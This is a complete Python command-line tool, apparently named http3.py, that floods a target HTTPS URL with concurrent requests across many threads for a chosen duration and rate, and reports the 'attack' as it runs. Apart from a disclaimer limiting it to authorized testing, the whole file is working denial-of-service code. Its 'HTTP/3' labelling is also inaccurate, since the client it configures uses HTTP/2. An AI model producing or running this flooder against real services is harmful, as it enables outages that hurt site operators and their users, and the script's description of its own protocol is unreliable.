#!/usr/bin/env python3
import argparse
import asyncio
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import httpx
import ssl
from urllib.parse import urlparse

class HTTP3Flooder:
    def __init__(self, target, duration, rate, threads):
        self.target = target
        self.duration = duration
        self.rate = rate
        self.threads = threads
        self.requests_sent = 0
        self.requests_failed = 0
        self.start_time = None
        self.stop_flag = threading.Event()
        
    async def send_request(self, client):
        """Send a single HTTP/3 request"""
        try:
            response = await client.get(self.target)
            self.requests_sent += 1
            return response.status_code
        except Exception as e:
            self.requests_failed += 1
            return None
    
    async def worker(self):
        """Worker coroutine that sends requests at specified rate"""
        # Configure HTTP/3 client
        async with httpx.AsyncClient(
            http2=True,
            verify=False,
            timeout=httpx.Timeout(5.0),
            limits=httpx.Limits(max_keepalive_connections=100, max_connections=1000)
        ) as client:
            delay = 1.0 / self.rate if self.rate > 0 else 0
            
            while not self.stop_flag.is_set():
                if time.time() - self.start_time >= self.duration:
                    break
                    
                await self.send_request(client)
                
                if delay > 0:
                    await asyncio.sleep(delay)
    
    def thread_worker(self):
        """Thread worker that runs async event loop"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.worker())
        loop.close()
    
    def run(self):
        """Run the flooder with specified number of threads"""
        print(f"[*] Starting HTTP/3 flood attack")
        print(f"[*] Target: {self.target}")
        print(f"[*] Duration: {self.duration} seconds")
        print(f"[*] Rate: {self.rate} requests/second per thread")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Total expected rate: {self.rate * self.threads} requests/second")
        print("-" * 50)
        
        self.start_time = time.time()
        
        # Create and start threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.thread_worker)
            t.start()
            threads.append(t)
        
        # Monitor progress
        try:
            while time.time() - self.start_time < self.duration:
                elapsed = time.time() - self.start_time
                current_rate = self.requests_sent / elapsed if elapsed > 0 else 0
                print(f"\r[+] Elapsed: {elapsed:.1f}s | Sent: {self.requests_sent} | Failed: {self.requests_failed} | Rate: {current_rate:.1f} req/s", end="")
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
        
        # Stop all threads
        self.stop_flag.set()
        
        # Wait for threads to finish
        for t in threads:
            t.join()
        
        # Print final statistics
        total_time = time.time() - self.start_time
        actual_rate = self.requests_sent / total_time if total_time > 0 else 0
        
        print(f"\n\n[*] Attack completed")
        print(f"[*] Total time: {total_time:.2f} seconds")
        print(f"[*] Total requests sent: {self.requests_sent}")
        print(f"[*] Total requests failed: {self.requests_failed}")
        print(f"[*] Average rate: {actual_rate:.2f} requests/second")
        print(f"[*] Success rate: {(self.requests_sent / (self.requests_sent + self.requests_failed) * 100):.2f}%" if (self.requests_sent + self.requests_failed) > 0 else "N/A")

def main():
    parser = argparse.ArgumentParser(
        description="HTTP/3 Request Flooder - For testing purposes only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 http3.py https://example.com 60 100 10
  python3 http3.py https://example.com 30 50 5
  
Note: This tool is for authorized testing only. Do not use against
      systems you don't own or have explicit permission to test.
        """
    )
    
    parser.add_argument("target", help="Target URL (must include https://)")
    parser.add_argument("time", type=int, help="Duration of the attack in seconds")
    parser.add_argument("rate", type=int, help="Requests per second per thread")
    parser.add_argument("threads", type=int, help="Number of threads to use")
    
    args = parser.parse_args()
    
    # Validate target URL
    parsed = urlparse(args.target)
    if not parsed.scheme or not parsed.netloc:
        print("[!] Invalid target URL. Must include https://")
        return
    
    if parsed.scheme != "https":
        print("[!] Only HTTPS targets are supported for HTTP/3")
        return
    
    # Validate parameters
    if args.time <= 0:
        print("[!] Time must be greater than 0")
        return
    
    if args.rate <= 0:
        print("[!] Rate must be greater than 0")
        return
    
    if args.threads <= 0:
        print("[!] Threads must be greater than 0")
        return
    
    # Warning message
    print("=" * 60)
    print("WARNING: This tool is for authorized testing only!")
    print("Using this tool against systems you don't own or")
    print("without permission is illegal and unethical.")
    print("=" * 60)
    print()
    
    # Create and run flooder
    flooder = HTTP3Flooder(args.target, args.time, args.rate, args.threads)
    flooder.run()

if __name__ == "__main__":
    main()